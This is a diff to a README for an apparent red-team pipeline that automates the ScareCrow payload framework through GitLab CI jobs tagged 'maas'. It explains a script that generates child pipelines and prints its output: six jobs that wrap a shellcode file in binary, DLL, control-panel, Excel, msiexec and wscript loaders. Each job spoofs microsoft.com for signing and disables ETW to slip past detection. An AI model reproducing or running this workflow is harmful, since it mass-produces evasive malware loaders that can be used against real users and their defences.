@@ -95,7 +95,73 @@ ScareCrow:
 
 The result of using this *trigger* section will dynamically create a pipeline run from the file named "**.scarecrow.yml**" which has been created in the **PreProcess** stage by the "**ScareCrow_Pipeline.py**" script.
 
+#### What does ScareCrow_Pipeline.py do?
 
+The **ScareCrow_Pipeline.py** script actually imports the ConfigLookup() functionality from the **ConfigLookup.py** module/script. Using this it creates a Gitlab YAML file which is properly formatted for the parallel child pipeline stages to be executed. While this has been executed by the **ProProcess** stage, we can easily execute it manually and see that the parallelism introduced is based upon the different *Loader* options involved with ScareCrow.
+
+The script also takes into account the various other options configured in the **SampleConfig.yml** file which should be manually edited by the operator.
+
+```
+$ bin/ScareCrow_Pipeline.py -c SampleConfig.yml
+
+stages:
+    - ScareCrow
+
+ScareCrow00:
+    stage: ScareCrow
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader binary -domain microsoft.com -noetw -nosleep
+
+ScareCrow01:
+    stage: ScareCrow
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader dll -domain microsoft.com -noetw -nosleep
+
+ScareCrow02:
+    stage: ScareCrow
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader control -domain microsoft.com -noetw -nosleep -O output.js
+
+ScareCrow03:
+    stage: ScareCrow
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader excel -domain microsoft.com -noetw -nosleep -O output.js
+
+ScareCrow04:
+    stage: ScareCrow
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader msiexec -domain microsoft.com -noetw -nosleep -O output.js
+
+ScareCrow05:
+    stage: ScareCrow
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader wscript -domain microsoft.com -noetw -nosleep -O output.js
+
+```
 
 
 
